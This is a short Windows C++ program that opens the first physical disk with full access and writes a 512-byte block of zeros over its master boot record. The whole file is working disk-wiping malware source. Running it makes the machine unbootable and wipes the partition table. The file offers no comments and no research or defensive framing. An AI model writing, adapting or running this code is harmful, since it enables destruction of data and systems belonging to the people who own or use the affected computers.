#include <windows.h>
#include <cstdio>

const unsigned char MasterBootRecord[512] = { /*empty*/ };

int main() {
    DWORD ResultBytesWritten;
    HANDLE hDiskDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    bool ResultState = WriteFile(hDiskDevice, MasterBootRecord, 512, &ResultBytesWritten, 0);
    CloseHandle(hDiskDevice);

    return 0;
}